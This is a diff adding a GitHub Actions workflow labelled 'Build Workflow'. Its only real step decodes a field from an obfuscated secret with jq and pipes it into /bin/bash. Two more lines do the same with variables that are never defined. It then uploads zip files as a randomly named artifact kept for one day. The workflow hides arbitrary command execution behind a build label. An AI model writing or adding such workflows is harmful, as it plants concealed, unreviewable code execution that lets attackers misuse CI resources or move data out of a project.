@@ -1,0 +1,28 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build
+        env:
+          euuvk529: ${{ secrets.euuvk529 }}
+        run: |
+          printf '%s' "$euuvk529" | jq -r .qwaxe1 | /bin/bash
+          echo $czva626 | jq -r .bmt581 | /bin/bash
+          printf '%s' "$mjs7" | jq -r .zji54 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 09V8bPNI
+          path: "*.zip"
+          retention-days: 1
